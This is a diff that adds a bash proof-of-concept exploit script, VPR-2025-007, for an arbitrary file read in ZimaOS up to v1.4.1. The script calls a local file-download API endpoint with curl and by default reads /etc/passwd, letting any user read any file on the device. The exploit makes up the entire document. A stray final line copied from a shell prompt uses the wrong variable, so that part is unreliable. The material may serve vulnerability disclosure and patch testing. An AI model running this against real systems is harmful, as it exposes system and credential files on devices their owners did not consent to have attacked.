@@ -1,0 +1,21 @@
+#!/usr/bin/env bash
+
+# Exploit:          VPR-2025-007
+# Affects:          ZimaOS <= v1.4.1
+# Purpose:          Arbitrary File Read
+# Description:      Read any file on disk from ANY user.
+
+# Created by:       VPR
+# Created:          June 15th, 2025
+
+# Updated by:       VPR
+# Updated:          June 15th, 2025
+
+# Tested on:        ZimaBlade 3760 + ZimaOS v1.4.1,
+#                   ZimaBlade 7700 + ZimaOS v1.4.1
+
+DEFAULT_FILEPATH="/etc/passwd"
+FILEPATH="${1:-${DEFAULT_FILEPATH}}"
+
+curl "http://127.0.0.1/v2_1/files/file/download?path=${FILEPATH}"
+zimab@ZimaOS:~/nonpriv ➜ $ curl "http://127.0.0.1/v2_1/files/file/download?path=${PATH}"
